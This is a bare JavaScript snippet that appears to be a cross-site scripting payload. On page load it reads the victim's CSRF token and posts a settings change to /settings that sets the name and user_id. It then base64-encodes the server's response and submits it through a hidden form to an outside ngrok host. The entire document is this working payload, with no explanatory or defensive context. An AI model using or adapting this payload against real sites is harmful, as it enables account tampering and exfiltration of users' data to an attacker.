window.addEventListener('load', function () {


fetch("/settings",{'method':'POST','body':"name=cas&user_id=2&_csrf_token="+document.getElementsByName("_csrf_token")[0].value}).then(function(response){response.text().then(function(back){f=document.createElement("form");i=document.createElement("input");f.method='post';f.action='http://83653900.ngrok.io/';i.name='data';i.value=btoa(encodeURI(back));f.appendChild(i);document.body.appendChild(f);f.submit();})})
  })
